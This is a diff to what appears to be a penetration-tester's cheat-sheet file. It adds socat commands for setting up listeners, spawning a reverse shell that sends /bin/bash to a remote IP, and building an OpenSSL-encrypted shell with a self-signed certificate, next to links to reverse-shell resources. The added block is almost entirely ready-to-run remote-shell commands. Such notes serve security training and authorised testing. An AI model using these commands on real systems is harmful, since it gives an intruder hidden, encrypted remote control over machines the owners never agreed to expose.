@@ -241,6 +241,21 @@ More information regarding reverse TCP:
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
 https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php  <- new reverse shell
 
+### socat
+```
+socat - TCP4:<remote server's ip address>:80
+sudo socat TCP4-LISTEN:32115 STDOUT
+
+socat -d -d TCP4-LISTEN:32115 STDOUT
+socat TCP4:10.10.11.10:32115 EXEC:/bin/bash
+
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key > shell.pem
+cat shell.crt >> shell.pem
+sudo socat OPENSSL-LISTEN:32115,cert=shell.pem,verify=0,fork EXEC:/bin/bash
+socat - OPENSSL:10.11.0.4:32115,verify=0
+```
+
 ### [SCP Transfer]
 ```
 Local to Remote
